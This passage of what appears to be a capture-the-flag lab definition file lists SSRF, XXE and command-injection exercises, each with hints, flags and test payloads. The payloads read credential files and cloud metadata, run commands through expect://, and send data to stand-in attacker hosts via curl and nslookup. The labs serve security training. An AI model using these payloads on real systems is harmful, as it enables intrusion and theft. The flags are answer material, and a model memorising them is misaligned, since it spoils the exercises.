        'scenario': 'Fetch file from internal server.',
        'vulnerableCode': 'Download file from: [user_url]',
        'hint1': 'Try private IP ranges: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16.',
        'hint2': 'Scan common IPs: 10.0.0.1, 192.168.1.1.',
        'hint3': 'Payload: http://192.168.1.100:8080/admin',
        'flag': 'FLAG{ssrf_private_net_102}',
        'testPayload': 'http://192.168.1.100:8080'
    },
    {
        'id': 103,
        'title': 'SSRF - File Protocol',
        'category': 'ssrf',
        'difficulty': 1,
        'points': 75,
        'description': 'Read local files using file: protocol.',
        'scenario': 'URL handler supports file:// scheme.',
        'vulnerableCode': 'urllib.urlopen(url)',
        'hint1': 'file:// protocol can read local files.',
        'hint2': 'Try: file:///etc/passwd',
        'hint3': 'Payload: file:///etc/shadow',
        'flag': 'FLAG{ssrf_file_protocol_103}',
        'testPayload': 'file:///etc/passwd'
    },
    {
        'id': 104,
        'title': 'SSRF - AWS Metadata Service',
        'category': 'ssrf',
        'difficulty': 2,
        'points': 100,
        'description': 'Access AWS EC2 metadata service.',
        'scenario': 'Application running on EC2 instance.',
        'vulnerableCode': 'Fetch data from user-provided URL',
        'hint1': 'AWS metadata at 169.254.169.254.',
        'hint2': 'Endpoint: http://169.254.169.254/latest/meta-data/',
        'hint3': 'Get credentials: /latest/meta-data/iam/security-credentials/',
        'flag': 'FLAG{ssrf_aws_metadata_104}',
        'testPayload': 'http://169.254.169.254/latest/meta-data/'
    },
    {
        'id': 105,
        'title': 'SSRF - Docker Daemon Access',
        'category': 'ssrf',
        'difficulty': 2,
        'points': 100,
        'description': 'Access Docker daemon socket.',
        'scenario': 'Docker socket exposed to application.',
        'vulnerableCode': 'Connect to unix:///var/run/docker.sock',
        'hint1': 'Docker daemon listens on unix socket.',
        'hint2': 'Payload: unix:///var/run/docker.sock',
        'hint3': 'Can execute docker commands and access containers.',
        'flag': 'FLAG{ssrf_docker_105}',
        'testPayload': 'unix:///var/run/docker.sock'
    },
    {
        'id': 106,
        'title': 'SSRF - Redis Access',
        'category': 'ssrf',
        'difficulty': 1,
        'points': 75,
        'description': 'Access Redis service via SSRF.',
        'scenario': 'Redis on internal network without authentication.',
        'vulnerableCode': 'Fetch from unvalidated URL',
        'hint1': 'Redis typically on port 6379.',
        'hint2': 'Try: http://localhost:6379/',
        'hint3': 'Can read session data and cache.',
        'flag': 'FLAG{ssrf_redis_106}',
        'testPayload': 'http://localhost:6379/'
    },
    {
        'id': 107,
        'title': 'SSRF - LDAP Protocol',
        'category': 'ssrf',
        'difficulty': 2,
        'points': 100,
        'description': 'Exploit SSRF to access LDAP.',
        'scenario': 'LDAP directory on internal network.',
        'vulnerableCode': 'URL handler supports ldap://scheme',
        'hint1': 'LDAP typically on port 389 or 636.',
        'hint2': 'Payload: ldap://localhost/ou=users',
        'hint3': 'Can enumerate LDAP directory structure.',
        'flag': 'FLAG{ssrf_ldap_107}',
        'testPayload': 'ldap://localhost/ou=users'
    },
    {
        'id': 108,
        'title': 'SSRF - Gopher Protocol',
        'category': 'ssrf',
        'difficulty': 2,
        'points': 100,
        'description': 'SSRF via Gopher protocol.',
        'scenario': 'Older application supports Gopher.',
        'vulnerableCode': 'urllib handles gopher:// URLs',
        'hint1': 'Gopher protocol allows raw network I/O.',
        'hint2': 'Payload: gopher://localhost:25',
        'hint3': 'Can send SMTP commands via gopher.',
        'flag': 'FLAG{ssrf_gopher_108}',
        'testPayload': 'gopher://localhost:25'
    },
    {
        'id': 109,
        'title': 'SSRF - Dict Protocol',
        'category': 'ssrf',
        'difficulty': 2,
        'points': 100,
        'description': 'SSRF using Dict protocol.',
        'scenario': 'Application processes Dict URLs.',
        'vulnerableCode': 'curl/urllib supports dict://',
        'hint1': 'Dict protocol for simple network access.',
        'hint2': 'Payload: dict://localhost:11211/stats',
        'hint3': 'Access memcached or other services.',
        'flag': 'FLAG{ssrf_dict_109}',
        'testPayload': 'dict://localhost:11211/stats'
    },
    {
        'id': 110,
        'title': 'SSRF - URL Encoding Bypass',
        'category': 'ssrf',
        'difficulty': 2,
        'points': 100,
        'description': 'Bypass SSRF filter with URL encoding.',
        'scenario': 'Application blocks 127.0.0.1 but allows encoded version.',
        'vulnerableCode': 'Check for string "127.0.0.1"',
        'hint1': 'Try different encodings: %2e%2e, Double encoding.',
        'hint2': 'IP encoding: 2130706433 (decimal), 0x7f000001 (hex).',
        'hint3': 'Payload: http://0x7f000001/',
        'flag': 'FLAG{ssrf_url_encoding_110}',
        'testPayload': 'http://0x7f000001/'
    },
    {
        'id': 111,
        'title': 'SSRF - Combined with SQLi',
        'category': 'ssrf',
        'difficulty': 3,
        'points': 150,
        'description': 'SSRF to access database server.',
        'scenario': 'Connect to MySQL on internal network via SSRF.',
        'vulnerableCode': 'Fetch URL then process as database connection',
        'hint1': 'SSRF to reach internal MySQL (port 3306).',
        'hint2': 'Then perform SQL injection on the connection.',
        'hint3': 'Payload: Access localhost:3306, inject SQL.',
        'flag': 'FLAG{ssrf_combined_sqli_111}',
        'testPayload': 'mysql://localhost:3306'
    },
    {
        'id': 112,
        'title': 'SSRF - FTP Protocol',
        'category': 'ssrf',
        'difficulty': 2,
        'points': 100,
        'description': 'Access FTP via SSRF.',
        'scenario': 'FTP server on internal network.',
        'vulnerableCode': 'urllib handles ftp:// URLs',
        'hint1': 'FTP typically on port 21.',
        'hint2': 'Payload: ftp://localhost/',
        'hint3': 'Can list and download files via FTP.',
        'flag': 'FLAG{ssrf_ftp_protocol_112}',
        'testPayload': 'ftp://localhost/'
    },
    {
        'id': 113,
        'title': 'SSRF - DNS Rebinding',
        'category': 'ssrf',
        'difficulty': 3,
        'points': 150,
        'description': 'SSRF via DNS rebinding.',
        'scenario': 'Attacker controls domain, changes DNS resolution.',
        'vulnerableCode': 'First check passes, second resolves to internal IP.',
        'hint1': 'First DNS lookup: attacker IP.',
        'hint2': 'Second lookup: 127.0.0.1 or internal IP.',
        'hint3': 'Browser/App uses second resolution.',
        'flag': 'FLAG{ssrf_dns_rebinding_113}',
        'testPayload': 'http://attacker-controlled-domain.com'
    },
    {
        'id': 114,
        'title': 'SSRF - Null Byte Injection',
        'category': 'ssrf',
        'difficulty': 2,
        'points': 100,
        'description': 'Bypass SSRF filter with null bytes.',
        'scenario': 'Whitelist check can be bypassed.',
        'vulnerableCode': 'if url.startswith("https://"): allow',
        'hint1': 'Null byte terminates string in some contexts.',
        'hint2': 'Payload: https://allowed.com%00http://localhost/',
        'hint3': 'First part passes check, null stops processing.',
        'flag': 'FLAG{ssrf_null_byte_114}',
        'testPayload': 'http://allowed.com%00http://localhost/'
    },
    {
        'id': 115,
        'title': 'SSRF - Cloud Provider Metadata',
        'category': 'ssrf',
        'difficulty': 2,
        'points': 100,
        'description': 'Access cloud provider metadata.',
        'scenario': 'Google Cloud, Azure, or DigitalOcean metadata.',
        'vulnerableCode': 'Fetch URL without validation',
        'hint1': 'Google Cloud: 169.254.169.254/computeMetadata/v1.',
        'hint2': 'Azure: 169.254.169.254/metadata/instance.',
        'hint3': 'DigitalOcean: 169.254.169.254/metadata/v1.',
        'flag': 'FLAG{ssrf_cloud_metadata_115}',
        'testPayload': 'http://169.254.169.254/metadata/v1'
    },
    {
        'id': 116,
        'title': 'SSRF - PHP Wrapper',
        'category': 'ssrf',
        'difficulty': 2,
        'points': 100,
        'description': 'Use PHP wrappers for SSRF.',
        'scenario': 'PHP file_get_contents() processes URL.',
        'vulnerableCode': 'file_get_contents($url)',
        'hint1': 'PHP supports data://, php:// wrappers.',
        'hint2': 'Payload: php://filter/convert.base64-encode/resource=index.php',
        'hint3': 'Read source code via wrapper.',
        'flag': 'FLAG{ssrf_php_wrapper_116}',
        'testPayload': 'php://filter/convert.base64-encode/resource=index.php'
    },
    {
        'id': 117,
        'title': 'SSRF - Data URI Scheme',
        'category': 'ssrf',
        'difficulty': 1,
        'points': 75,
        'description': 'Exploit SSRF with data: URI.',
        'scenario': 'Application fetches data: URLs.',
        'vulnerableCode': 'urllib.urlopen(user_url)',
        'hint1': 'data: URIs contain inline data.',
        'hint2': 'Payload: data:text/html,<h1>Pwned</h1>',
        'hint3': 'Can bypass filters expecting http/https.',
        'flag': 'FLAG{ssrf_data_uri_117}',
        'testPayload': 'data:text/html,test'
    },
    {
        'id': 118,
        'title': 'SSRF - IP Shorthand Notation',
        'category': 'ssrf',
        'difficulty': 2,
        'points': 100,
        'description': 'Bypass SSRF using IP shorthand.',
        'scenario': 'Filter blocks 127.0.0.1 but accepts shorthand.',
        'vulnerableCode': 'Whitelist check on IP format',
        'hint1': 'Shorthand: 127.1 = 127.0.0.1, 10.0.1 = 10.0.0.1.',
        'hint2': 'Octal notation: 0177.0.0.1 = 127.0.0.1.',
        'hint3': 'Payload: http://127.1/',
        'flag': 'FLAG{ssrf_ip_shorthand_118}',
        'testPayload': 'http://127.1/'
    },
    {
        'id': 119,
        'title': 'SSRF - Authentication Bypass',
        'category': 'ssrf',
        'difficulty': 2,
        'points': 100,
        'description': 'Bypass authentication via SSRF.',
        'scenario': 'Internal service only accessible from server.',
        'vulnerableCode': 'Fetch URL from internal network',
        'hint1': 'SSRF makes request from server, bypassing IP restrictions.',
        'hint2': 'Access admin panel as if from localhost.',
        'hint3': 'Payload: http://admin-internal.local/dashboard',
        'flag': 'FLAG{ssrf_auth_bypass_119}',
        'testPayload': 'http://admin-internal.local/dashboard'
    },
    {
        'id': 120,
        'title': 'SSRF - Redirect Following',
        'category': 'ssrf',
        'difficulty': 2,
        'points': 100,
        'description': 'Exploit SSRF via HTTP redirects.',
        'scenario': 'Application follows redirects.',
        'vulnerableCode': 'requests.get(url, allow_redirects=True)',
        'hint1': 'First request to allowed domain.',
        'hint2': 'Server redirects to internal IP.',
        'hint3': 'Payload: allowed.com/redirect?to=http://localhost/',
        'flag': 'FLAG{ssrf_redirect_follow_120}',
        'testPayload': 'http://allowed.com/redirect'
    },

    # ==================== XXE - XML External Entity Injection (Labs 121-140) ====================
    {
        'id': 121,
        'title': 'XXE - Basic File Disclosure',
        'category': 'xxe',
        'difficulty': 1,
        'points': 75,
        'description': 'Read files via XXE.',
        'scenario': 'XML parser processes external entities.',
        'vulnerableCode': 'ET.fromstring(xml_data)',
        'hint1': 'Define DOCTYPE with ENTITY pointing to file.',
        'hint2': 'Use file:// protocol in SYSTEM.',
        'hint3': 'Payload: <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        'flag': 'FLAG{xxe_file_disclosure_121}',
        'testPayload': '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    },
    {
        'id': 122,
        'title': 'XXE - DoS Attack',
        'category': 'xxe',
        'difficulty': 1,
        'points': 75,
        'description': 'Denial of Service via XXE.',
        'scenario': 'Billion laughs attack.',
        'vulnerableCode': 'Parse XML with entity expansion',
        'hint1': 'Exponential entity expansion.',
        'hint2': 'Each entity expands multiple times.',
        'hint3': 'Payload: Multiple nested entity definitions.',
        'flag': 'FLAG{xxe_dos_attack_122}',
        'testPayload': '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;">]>'
    },
    {
        'id': 123,
        'title': 'XXE - Remote Code Execution',
        'category': 'xxe',
        'difficulty': 3,
        'points': 150,
        'description': 'XXE leading to RCE.',
        'scenario': 'Expect library allows RCE.',
        'vulnerableCode': 'Parse XML with SYSTEM and expect protocol',
        'hint1': 'Some XML parsers support expect:// protocol.',
        'hint2': 'Execute commands via expect protocol.',
        'hint3': 'Payload: <!ENTITY xxe SYSTEM "expect://id">',
        'flag': 'FLAG{xxe_rce_123}',
        'testPayload': '<!ENTITY xxe SYSTEM "expect://id">'
    },
    {
        'id': 124,
        'title': 'XXE - UNC Path Access',
        'category': 'xxe',
        'difficulty': 1,
        'points': 75,
        'description': 'Access UNC paths via XXE.',
        'scenario': 'Windows environment with file sharing.',
        'vulnerableCode': 'ET.fromstring(xml)',
        'hint1': 'UNC paths: \\\\\\\\server\\\\share',
        'hint2': 'Converted to URL: file:////server/share',
        'hint3': 'Payload: <!ENTITY xxe SYSTEM "file:////server/share/file">',
        'flag': 'FLAG{xxe_unc_path_124}',
        'testPayload': 'file:////server/share'
    },
    {
        'id': 125,
        'title': 'XXE - SVG XXE',
        'category': 'xxe',
        'difficulty': 1,
        'points': 75,
        'description': 'XXE via SVG file upload.',
        'scenario': 'SVG file processed with XXE vulnerability.',
        'vulnerableCode': 'ET.parse(svg_file)',
        'hint1': 'SVG is XML-based.',
        'hint2': 'Can contain XXE payloads.',
        'hint3': 'Payload: <svg with XXE DOCTYPE>',
        'flag': 'FLAG{xxe_svg_125}',
        'testPayload': '<svg></svg>'
    },
    {
        'id': 126,
        'title': 'XXE - Blind XXE',
        'category': 'xxe',
        'difficulty': 2,
        'points': 100,
        'description': 'Blind XXE with out-of-band exfiltration.',
        'scenario': 'No direct output, use OOB channel.',
        'vulnerableCode': 'Parse XML, no error output',
        'hint1': 'Use DTD to trigger outbound connection.',
        'hint2': 'Send data to attacker server.',
        'hint3': 'Payload: ENTITY with callback URL.',
        'flag': 'FLAG{xxe_blind_oob_126}',
        'testPayload': '<!ENTITY xxe SYSTEM "http://attacker.com/collect?data=">'
    },
    {
        'id': 127,
        'title': 'XXE - Parameter Entity',
        'category': 'xxe',
        'difficulty': 2,
        'points': 100,
        'description': 'XXE using parameter entities.',
        'scenario': 'Parameter entities in DTD.',
        'vulnerableCode': 'Parse XML with parameter entities',
        'hint1': 'Parameter entities: %entity;',
        'hint2': 'Used in DTD only.',
        'hint3': 'Payload: <!ENTITY % pe SYSTEM "file:///etc/passwd">',
        'flag': 'FLAG{xxe_param_entity_127}',
        'testPayload': '<!ENTITY % pe SYSTEM "file:///etc/passwd">'
    },
    {
        'id': 128,
        'title': 'XXE - External DTD',
        'category': 'xxe',
        'difficulty': 2,
        'points': 100,
        'description': 'XXE via external DTD file.',
        'scenario': 'DTD loaded from attacker-controlled server.',
        'vulnerableCode': 'Parse XML with external DTD',
        'hint1': 'Reference external DTD.',
        'hint2': 'DTD can contain XXE payload.',
        'hint3': 'Payload: <!DOCTYPE root SYSTEM "http://attacker.com/evil.dtd">',
        'flag': 'FLAG{xxe_external_dtd_128}',
        'testPayload': '<!DOCTYPE root SYSTEM "http://attacker.com/evil.dtd">'
    },
    {
        'id': 129,
        'title': 'XXE - Data Exfiltration via CDATA',
        'category': 'xxe',
        'difficulty': 2,
        'points': 100,
        'description': 'XXE exfiltration using CDATA.',
        'scenario': 'Wrap exfiltrated data in CDATA.',
        'vulnerableCode': 'Parse XML and process CDATA sections',
        'hint1': 'CDATA avoids XML parsing of content.',
        'hint2': 'Wrap sensitive data in CDATA.',
        'hint3': 'Payload: Combine XXE with CDATA wrapping.',
        'flag': 'FLAG{xxe_data_exfil_cdata_129}',
        'testPayload': '<![CDATA[XXE payload]]>'
    },
    {
        'id': 130,
        'title': 'XXE - SOAP XXE',
        'category': 'xxe',
        'difficulty': 2,
        'points': 100,
        'description': 'XXE in SOAP webservice.',
        'scenario': 'SOAP endpoint parses XML without XXE protection.',
        'vulnerableCode': 'Parse SOAP request XML',
        'hint1': 'SOAP is XML-based.',
        'hint2': 'XXE in SOAP Envelope.',
        'hint3': 'Payload: SOAP with XXE DOCTYPE.',
        'flag': 'FLAG{xxe_soap_130}',
        'testPayload': '<soap:Envelope></soap:Envelope>'
    },
    {
        'id': 131,
        'title': 'XXE - libxml2 Specific',
        'category': 'xxe',
        'difficulty': 2,
        'points': 100,
        'description': 'XXE in libxml2 parser.',
        'scenario': 'PHP with libxml configured to allow XXE.',
        'vulnerableCode': 'simplexml_load_string() or DOMDocument',
        'hint1': 'libxml has specific XXE behavior.',
        'hint2': 'Default may allow entity expansion.',
        'hint3': 'Payload: Standard XXE works with libxml2.',
        'flag': 'FLAG{xxe_libxml2_131}',
        'testPayload': '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    },
    {
        'id': 132,
        'title': 'XXE - MSXML Parser',
        'category': 'xxe',
        'difficulty': 2,
        'points': 100,
        'description': 'XXE in Microsoft XML parser.',
        'scenario': '.NET application with MSXML.',
        'vulnerableCode': 'XmlDocument.Load() or Parse()',
        'hint1': 'MSXML has different XXE behavior.',
        'hint2': 'May require specific configuration.',
        'hint3': 'Payload: MSXML-specific XXE.',
        'flag': 'FLAG{xxe_msxml_132}',
        'testPayload': '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:c:\\\\windows\\\\system32\\\\config\\\\sam">]>'
    },
    {
        'id': 133,
        'title': 'XXE - XInclude Attack',
        'category': 'xxe',
        'difficulty': 2,
        'points': 100,
        'description': 'XXE via XInclude.',
        'scenario': 'Application processes XInclude directives.',
        'vulnerableCode': 'Parse XML with XInclude enabled',
        'hint1': 'XInclude allows inclusion of files.',
        'hint2': 'Payload: <xi:include href="file:///etc/passwd">',
        'hint3': 'Similar effect to XXE but different mechanism.',
        'flag': 'FLAG{xxe_xinclude_133}',
        'testPayload': '<xi:include href="file:///etc/passwd"/>'
    },
    {
        'id': 134,
        'title': 'XXE - XPath Injection via XXE',
        'category': 'xxe',
        'difficulty': 2,
        'points': 100,
        'description': 'Combine XXE with XPath injection.',
        'scenario': 'Both XXE and XPath vulnerabilities.',
        'vulnerableCode': 'Parse XML with XXE, query with XPath',
        'hint1': 'Use XXE to load data, then XPath injection.',
        'hint2': 'Two-stage attack.',
        'hint3': 'Payload: XXE DOCTYPE + XPath injection.',
        'flag': 'FLAG{xxe_xpath_injection_134}',
        'testPayload': '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    },
    {
        'id': 135,
        'title': 'XXE - Java XML Parser',
        'category': 'xxe',
        'difficulty': 2,
        'points': 100,
        'description': 'XXE in Java XML parsing.',
        'scenario': 'Java application with default XML parser.',
        'vulnerableCode': 'SAXParser.parse() or Document.parse()',
        'hint1': 'Java XML parsers vulnerable to XXE by default.',
        'hint2': 'SAXParser and DocumentBuilder affected.',
        'hint3': 'Payload: Standard XXE payload.',
        'flag': 'FLAG{xxe_java_parser_135}',
        'testPayload': '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    },
    {
        'id': 136,
        'title': 'XXE - Data Wrapper',
        'category': 'xxe',
        'difficulty': 2,
        'points': 100,
        'description': 'XXE using data: wrapper.',
        'scenario': 'ENTITY references data: URI.',
        'vulnerableCode': 'Parse XML with data wrapper support',
        'hint1': 'Data wrapper can encode file content.',
        'hint2': 'Use base64 encoding for binary data.',
        'hint3': 'Payload: <!ENTITY xxe SYSTEM "data:text/plain,test">',
        'flag': 'FLAG{xxe_data_wrapper_136}',
        'testPayload': 'data:text/plain,test'
    },
    {
        'id': 137,
        'title': 'XXE - JAR Wrapper',
        'category': 'xxe',
        'difficulty': 2,
        'points': 100,
        'description': 'XXE using JAR wrapper.',
        'scenario': 'Java application with JAR file access.',
        'vulnerableCode': 'Parse XML with JAR protocol support',
        'hint1': 'JAR wrapper can read from ZIP/JAR files.',
        'hint2': 'Payload: jar:file:///path/to/file.jar!/entry',
        'hint3': 'Access files inside JAR archives.',
        'flag': 'FLAG{xxe_jar_wrapper_137}',
        'testPayload': 'jar:file:///path/to/file.jar'
    },
    {
        'id': 138,
        'title': 'XXE - HTML Entity Filter Bypass',
        'category': 'xxe',
        'difficulty': 2,
        'points': 100,
        'description': 'Bypass XXE filter with HTML entities.',
        'scenario': 'Filter blocks DOCTYPE but allows entities.',
        'vulnerableCode': 'Incomplete XXE filtering',
        'hint1': 'Use HTML entity encoding in payload.',
        'hint2': 'Try: &lt;!DOCTYPE&gt; or similar.',
        'hint3': 'Bypass checks on raw DOCTYPE string.',
        'flag': 'FLAG{xxe_html_entity_bypass_138}',
        'testPayload': '&lt;!DOCTYPE root&gt;'
    },
    {
        'id': 139,
        'title': 'XXE - Schema Poisoning',
        'category': 'xxe',
        'difficulty': 3,
        'points': 150,
        'description': 'XXE via XML schema injection.',
        'scenario': 'Application validates against schema.',
        'vulnerableCode': 'Validate XML against schema',
        'hint1': 'Poison schema with XXE payload.',
        'hint2': 'Schema processed during validation.',
        'hint3': 'Payload: XXE in schema import/include.',
        'flag': 'FLAG{xxe_schema_poisoning_139}',
        'testPayload': 'XXE in schema'
    },
    {
        'id': 140,
        'title': 'XXE - DTD Caching Attack',
        'category': 'xxe',
        'difficulty': 2,
        'points': 100,
        'description': 'XXE via DTD cache poisoning.',
        'scenario': 'External DTD cached by parser.',
        'vulnerableCode': 'Cache external DTD responses',
        'hint1': 'DTD cached after first access.',
        'hint2': 'Can poison cache with XXE payload.',
        'hint3': 'Payload: Malicious DTD served and cached.',
        'flag': 'FLAG{xxe_dtd_caching_140}',
        'testPayload': 'http://attacker.com/malicious.dtd'
    },

    # ==================== COMMAND INJECTION (Labs 141-160) ====================
    {
        'id': 141,
        'title': 'Command Injection - Basic Semicolon',
        'category': 'command_injection',
        'difficulty': 1,
        'points': 75,
        'description': 'Chain commands with semicolon.',
        'scenario': 'Ping utility concatenates user input.',
        'vulnerableCode': 'system("ping -c 1 " + host)',
        'hint1': 'Semicolon terminates command.',
        'hint2': 'Try: google.com; whoami',
        'hint3': 'Payload: 8.8.8.8; id',
        'flag': 'FLAG{cmd_inj_semicolon_141}',
        'testPayload': '8.8.8.8; id'
    },
    {
        'id': 142,
        'title': 'Command Injection - Pipe Operator',
        'category': 'command_injection',
        'difficulty': 1,
        'points': 75,
        'description': 'Use pipe to chain commands.',
        'scenario': 'Output piped to another program.',
        'vulnerableCode': 'system("command | " + user_input)',
        'hint1': 'Pipe passes output as input.',
        'hint2': 'Try: grep test | cat',
        'hint3': 'Payload: first | second | third',
        'flag': 'FLAG{cmd_inj_pipe_142}',
        'testPayload': 'test | cat'
    },
    {
        'id': 143,
        'title': 'Command Injection - And Operator',
        'category': 'command_injection',
        'difficulty': 1,
        'points': 75,
        'description': '&& operator for conditional execution.',
        'scenario': 'Second command if first succeeds.',
        'vulnerableCode': 'system("first && " + user_input)',
        'hint1': '&& executes second if first exits 0.',
        'hint2': 'Try: true && whoami',
        'hint3': 'Payload: ls && id',
        'flag': 'FLAG{cmd_inj_and_143}',
        'testPayload': 'ls && id'
    },
    {
        'id': 144,
        'title': 'Command Injection - Or Operator',
        'category': 'command_injection',
        'difficulty': 1,
        'points': 75,
        'description': '|| operator for fallback execution.',
        'scenario': 'Second command if first fails.',
        'vulnerableCode': 'system("command || " + user_input)',
        'hint1': '|| executes second if first fails.',
        'hint2': 'Try: false || whoami',
        'hint3': 'Payload: invalid_cmd || id',
        'flag': 'FLAG{cmd_inj_or_144}',
        'testPayload': 'false || id'
    },
    {
        'id': 145,
        'title': 'Command Injection - Command Substitution',
        'category': 'command_injection',
        'difficulty': 1,
        'points': 75,
        'description': '$(command) substitution.',
        'scenario': 'Nested command execution.',
        'vulnerableCode': 'system("echo $(user_input)")',
        'hint1': '$() substitutes output.',
        'hint2': 'Try: $(whoami)',
        'hint3': 'Payload: $(cat /etc/passwd)',
        'flag': 'FLAG{cmd_inj_substitution_145}',
        'testPayload': '$(id)'
    },
    {
        'id': 146,
        'title': 'Command Injection - Backticks',
        'category': 'command_injection',
        'difficulty': 1,
        'points': 75,
        'description': 'Backtick command substitution.',
        'scenario': 'Legacy bash syntax.',
        'vulnerableCode': 'echo `user_input`',
        'hint1': 'Backticks `` also substitute.',
        'hint2': 'Try: `whoami`',
        'hint3': 'Payload: `id`',
        'flag': 'FLAG{cmd_inj_backticks_146}',
        'testPayload': '`whoami`'
    },
    {
        'id': 147,
        'title': 'Command Injection - Newline Character',
        'category': 'command_injection',
        'difficulty': 1,
        'points': 75,
        'description': 'Newline to separate commands.',
        'scenario': 'Filter blocks semicolons but allows newlines.',
        'vulnerableCode': 'Block ";" but allow "\\n"',
        'hint1': 'Newline creates separate line.',
        'hint2': 'Try: first_cmd\\nwhoami',
        'hint3': 'Payload: command\\nid',
        'flag': 'FLAG{cmd_inj_newline_147}',
        'testPayload': 'ls\nid'
    },
    {
        'id': 148,
        'title': 'Command Injection - Wildcard Abuse',
        'category': 'command_injection',
        'difficulty': 1,
        'points': 75,
        'description': 'Use wildcards to execute commands.',
        'scenario': 'Wildcard pattern matches executable.',
        'vulnerableCode': 'system("/path/* " + arg)',
        'hint1': 'Wildcard can match unexpected files.',
        'hint2': 'Try: /bin/* to run multiple commands.',
        'hint3': 'Payload: Create file with command name.',
        'flag': 'FLAG{cmd_inj_wildcard_148}',
        'testPayload': '/bin/*'
    },
    {
        'id': 149,
        'title': 'Command Injection - Variable Expansion',
        'category': 'command_injection',
        'difficulty': 2,
        'points': 100,
        'description': 'Exploit variable expansion.',
        'scenario': 'Variable contains user input.',
        'vulnerableCode': 'var=$user_input; system("command $var")',
        'hint1': 'Variables expanded in double quotes.',
        'hint2': 'Try: $(whoami) in variable value.',
        'hint3': 'Payload: Nested variable expansion.',
        'flag': 'FLAG{cmd_inj_var_expansion_149}',
        'testPayload': 'test${IFS}$(id)'
    },
    {
        'id': 150,
        'title': 'Command Injection - IFS Separator',
        'category': 'command_injection',
        'difficulty': 2,
        'points': 100,
        'description': 'Use IFS to bypass space filter.',
        'scenario': 'Filter blocks spaces.',
        'vulnerableCode': 'Block spaces, but allow other separators',
        'hint1': 'IFS (Internal Field Separator) default is whitespace.',
        'hint2': 'Can use ${IFS} instead of space.',
        'hint3': 'Payload: command${IFS}argument',
        'flag': 'FLAG{cmd_inj_ifs_separator_150}',
        'testPayload': 'id${IFS}-a'
    },
    {
        'id': 151,
        'title': 'Command Injection - Time-Based Blind',
        'category': 'command_injection',
        'difficulty': 2,
        'points': 100,
        'description': 'Blind command injection via sleep.',
        'scenario': 'No output, timing-based detection.',
        'vulnerableCode': 'Execute command, no output shown',
        'hint1': 'Use sleep to verify execution.',
        'hint2': 'Measure response time.',
        'hint3': 'Payload: sleep 5',
        'flag': 'FLAG{cmd_inj_time_blind_151}',
        'testPayload': 'sleep 5'
    },
    {
        'id': 152,
        'title': 'Command Injection - DNS-Based Blind',
        'category': 'command_injection',
        'difficulty': 2,
        'points': 100,
        'description': 'Blind command injection via DNS.',
        'scenario': 'Exfiltrate data through DNS.',
        'vulnerableCode': 'Command execution, no direct output',
        'hint1': 'Use nslookup with data in domain.',
        'hint2': 'Payload: nslookup $(whoami).attacker.com',
        'hint3': 'Check attacker DNS logs for result.',
        'flag': 'FLAG{cmd_inj_dns_blind_152}',
        'testPayload': 'nslookup data.attacker.com'
    },
    {
        'id': 153,
        'title': 'Command Injection - HTTP Callback',
        'category': 'command_injection',
        'difficulty': 2,
        'points': 100,
        'description': 'Blind injection via HTTP callback.',
        'scenario': 'Exfiltrate to HTTP endpoint.',
        'vulnerableCode': 'No output, but can reach external URL',
        'hint1': 'Use curl or wget to send data.',
        'hint2': 'Payload: curl http://attacker.com/?data=$(whoami)',
        'hint3': 'Check attacker logs for request.',
        'flag': 'FLAG{cmd_inj_http_callback_153}',
        'testPayload': 'curl http://attacker.com/?test=1'
    },
    {
        'id': 154,
        'title': 'Command Injection - Process Substitution',
        'category': 'command_injection',
        'difficulty': 2,
        'points': 100,
        'description': 'Process substitution for injection.',
        'scenario': 'Use <() syntax in bash.',
        'vulnerableCode': 'Execute bash with process substitution',
        'hint1': 'Process substitution: <(command)',
        'hint2': 'Creates temporary file descriptor.',
        'hint3': 'Payload: cat <(id)',
        'flag': 'FLAG{cmd_inj_process_subst_154}',
        'testPayload': 'cat <(id)'
    },
    {
        'id': 155,
        'title': 'Command Injection - Heredoc',
        'category': 'command_injection',
        'difficulty': 2,
        'points': 100,
        'description': 'Heredoc for multi-line injection.',
        'scenario': 'Inject multi-line script.',
        'vulnerableCode': 'Execute heredoc payload',
        'hint1': 'Heredoc syntax: << EOF',
        'hint2': 'Can contain multiple commands.',
        'hint3': 'Payload: cat << EOF\\nid\\nEOF',
        'flag': 'FLAG{cmd_inj_heredoc_155}',
        'testPayload': 'cat <<EOF\nid\nEOF'
    },
    {
        'id': 156,
        'title': 'Command Injection - Quote Bypass',
        'category': 'command_injection',
        'difficulty': 2,
        'points': 100,
        'description': 'Escape quotes for injection.',
        'scenario': 'Input wrapped in quotes.',
        'vulnerableCode': 'system("command \\""[user_input]"\\"")\\n',
        'hint1': 'Break out of quotes.',
        'hint2': 'Try: \\"; command; \\"',
        'hint3': 'Payload: Close quote, inject, reopen.',
        'flag': 'FLAG{cmd_inj_quote_bypass_156}',
        'testPayload': '"; id; "'
    },
    {
        'id': 157,
        'title': 'Command Injection - Encoding Bypass',
        'category': 'command_injection',
        'difficulty': 2,
        'points': 100,
        'description': 'Bypass filters with encoding.',
        'scenario': 'Filter blocks certain characters.',
        'vulnerableCode': 'Incomplete filter implementation',
        'hint1': 'Hex encoding: \\x69\\x64 for id.',
        'hint2': 'Base64 and decode.',
        'hint3': 'Payload: echo$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d)',
        'flag': 'FLAG{cmd_inj_encoding_bypass_157}',
        'testPayload': 'echo Y2F0|base64 -d'
    },
    {
        'id': 158,
        'title': 'Command Injection - Chained Attacks',
        'category': 'command_injection',
        'difficulty': 3,
        'points': 150,
        'description': 'Multiple injection techniques combined.',
        'scenario': 'Complex multi-stage payload.',
        'vulnerableCode': 'Multiple vulnerabilities in chain',
        'hint1': 'Combine encoding, substitution, operators.',
        'hint2': 'Bypass multiple filters.',
        'hint3': 'Payload: Complex nested injection.',
        'flag': 'FLAG{cmd_inj_chained_158}',
        'testPayload': '$(id)&$(whoami)'
    },
    {
        'id': 159,
        'title': 'Command Injection - Shell Specific',
        'category': 'command_injection',
        'difficulty': 2,
        'points': 100,
        'description': 'Exploit shell-specific features.',
        'scenario': 'Different shells have different syntax.',
